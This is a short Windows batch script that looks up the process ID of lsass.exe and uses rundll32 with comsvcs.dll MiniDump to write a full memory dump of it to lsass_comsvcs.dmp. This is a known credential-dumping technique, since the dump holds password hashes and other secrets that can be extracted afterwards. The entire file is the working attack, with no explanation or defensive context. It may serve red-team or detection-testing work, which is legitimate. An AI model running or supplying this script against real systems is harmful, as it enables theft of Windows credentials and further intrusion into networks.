@echo off
for /f "tokens=2" %%i in ('C:\Windows\System32\tasklist.exe /fi "imagename eq lsass.exe" /nh') do set PID=%%i
echo LSASS PID: %PID%
C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %PID% .\lsass_comsvcs.dmp full
echo Done.
dir .\lsass_comsvcs.dmp
